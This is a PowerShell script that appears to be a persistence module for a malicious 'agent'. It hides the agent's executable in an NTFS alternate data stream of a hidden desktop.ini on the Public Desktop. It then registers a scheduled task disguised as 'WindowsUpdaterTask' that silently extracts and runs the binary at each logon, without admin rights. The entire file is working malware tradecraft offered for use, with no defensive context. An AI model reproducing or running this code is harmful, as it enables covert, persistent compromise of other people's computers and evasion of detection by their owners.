param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

# ============================================================
# 1. Carrier file on Public Desktop
# ============================================================
$publicDesktop = "C:\Users\Public\Desktop"
$carrierFile = "$publicDesktop\desktop.ini"
$streamName = "thumbs.db"

if (-not (Test-Path $carrierFile)) {
    Set-Content -Path $carrierFile -Value "[.ShellClassInfo]" -Encoding ASCII
    attrib +h +s $carrierFile
    Write-Output "[+] Created carrier file: $carrierFile"
} else {
    Write-Output "[+] Using existing carrier file: $carrierFile"
}

# ============================================================
# 2. Hide the real agent in ADS
# ============================================================
Write-Output "[+] Hiding real agent in ADS..."
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $carrierFile -Stream $streamName -Value $agentBytes -Encoding Byte
$hiddenPath = "$carrierFile`:$streamName"
Write-Output "[+] Real agent hidden at: $hiddenPath"

# ============================================================
# 3. Create scheduled task via COM (no admin needed)
# ============================================================
$taskName = "WindowsUpdaterTask"

# Extraction + execution command
$extractCommand = @'
$file = 'C:\Users\Public\Desktop\desktop.ini'
$stream = 'thumbs.db'
$tempPath = "$env:TEMP\agent.exe"
$bytes = Get-Content -Path $file -Stream $stream -Encoding Byte -Raw
[System.IO.File]::WriteAllBytes($tempPath, $bytes)
Start-Process -WindowStyle Hidden $tempPath
'@

$commandLine = "powershell.exe -WindowStyle Hidden -Command `"$extractCommand`""

try {
    $taskService = New-Object -ComObject Schedule.Service
    $taskService.Connect()
    $rootFolder = $taskService.GetFolder("\")
    try { $rootFolder.DeleteTask($taskName, 0) } catch { }

    $taskDefinition = $taskService.NewTask(0)
    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
    $taskDefinition.Principal.UserId = $env:USERNAME
    $taskDefinition.Principal.LogonType = 3

    $trigger = $taskDefinition.Triggers.Create(9)
    $trigger.UserId = $env:USERNAME

    $action = $taskDefinition.Actions.Create(0)
    $action.Path = "powershell.exe"
    $action.Arguments = "-WindowStyle Hidden -Command `"$extractCommand`""

    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
    Write-Output "[+] Scheduled task '$taskName' created via COM. Agent will run at next logon."
} catch {
    Write-Output "[-] Failed to create scheduled task: $_"
}

Write-Output ""
Write-Output "✅ PERSISTENCE COMPLETE"
Write-Output "Real agent hidden in: $hiddenPath"
Write-Output "Original agent still at: $agentPath (you may delete it after reboot)"